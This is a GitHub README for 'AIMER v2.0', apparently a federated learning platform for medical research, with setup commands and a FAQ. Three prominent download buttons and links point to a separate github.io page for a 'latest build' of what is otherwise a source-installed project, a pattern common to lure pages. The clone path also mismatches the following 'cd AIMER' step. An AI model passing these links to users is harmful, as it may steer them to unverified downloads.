# AIMER v2.0 - Federated Learning Platform 2026

> **AIMER is an open source federated learning platform for medical research, built as a Python monorepo with paired Django and FastAPI services to support scalable, privacy-preserving model training.**

[![Platform](https://img.shields.io/badge/Platform-Python-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-v2.0-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/alexucuhill2662/aimer-model-training-hub?style=flat-square)](https://github.com/alexucuhill2662/aimer-model-training-hub)

---

<p align="center">
  <a href="https://alexucuhill2662.github.io/aimer-model-training-hub/">
    <img src="https://img.shields.io/badge/Download-AIMER%20Latest-brightgreen?style=for-the-badge" alt="Download AIMER">
  </a>
</p>

> **[Direct Download - AIMER v2.0](https://alexucuhill2662.github.io/aimer-model-training-hub/)**

---

[Download Latest Build](https://alexucuhill2662.github.io/aimer-model-training-hub/)

---

## Overview

AIMER combines three related projects inside one Python monorepo to support collaborative medical research at scale. It lets organizations train machine learning models across distributed datasets without exposing sensitive patient records, keeping privacy intact while enabling faster discovery. The codebase is organized so that web front ends, machine learning services, and auxiliary data workflows can evolve independently.

Its architecture is built around local integration for stores, observability, workflow tooling, and RAG dependencies, which makes it practical for both compact research efforts and large cross-institution deployments. With Django handling the user-facing application layer and FastAPI serving high-performance APIs, AIMER offers a solid production-oriented base for federated learning in healthcare settings.

## Capabilities

- Federated Learning platform focused on AI in Medical Research
- Python monorepo with three connected projects for flexible modular work
- Django web application with UI templates and built-in RAG code
- FastAPI-based ML/API service with MCP endpoints for model communication
- Companion Django service for data handling and platform workflows
- Local integration layer for stores, observability, workflow engines, and RAG dependencies
- CI/CD workflow using GitHub Actions, with automated dependency updates from Dependabot and Renovate

## Setup

Clone the repository and prepare the Python environment:

```bash
git clone https://github.com/alexucuhill2662/aimer-model-training-hub.git
cd AIMER
python -m venv venv
source venv/bin/activate  # On Windows: venv\Scripts\activate
pip install -r requirements.txt
```

Each project in the monorepo can have its own setup path. See the individual project directories for the relevant startup steps.

## Running the Platform

Start the Django web application:

```bash
cd aimer_web
python manage.py runserver
```

Launch the ML/API service:

```bash
cd aimer_ml
uvicorn main:app --reload
```

Access the supporting Django service for data workflows:

```bash
cd aimer_support
python manage.py runserver 8001
```

The local integration stack can be started using Docker Compose or individual service configurations provided in the repository.

## Configuration Notes

Each project keeps its settings in its own configuration files. Django projects rely on `settings.py`, while the FastAPI service uses environment variables or a `.env` file. The local integration stack is configured through Docker Compose files and service-specific settings. Check the `config/` directory for observability, workflow, and RAG dependency configuration.

## Requirements

- Python 3.9 or higher
- Django 4.x for web components
- FastAPI for ML/API service
- Docker (optional, for local integration stack)
- Minimum 4GB RAM recommended for full platform operation
- Storage space for model checkpoints and dataset references

## FAQ

**How does AIMER protect data privacy?**  
A federated learning workflow keeps raw data at the source. Participating nodes exchange only model updates.

**May I contribute to the project?**  
Yes. Contributions are welcome. Please read the contributing guidelines, then open an issue or submit a pull request.

**How frequently is the project updated?**  
Updates follow the CI/CD pipeline and automated dependency checks. Major releases are versioned and documented in the repository.

**What should I do if configuration problems appear?**  
Review the project-specific config files and the local integration stack documentation. If the issue remains, open a GitHub issue.

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
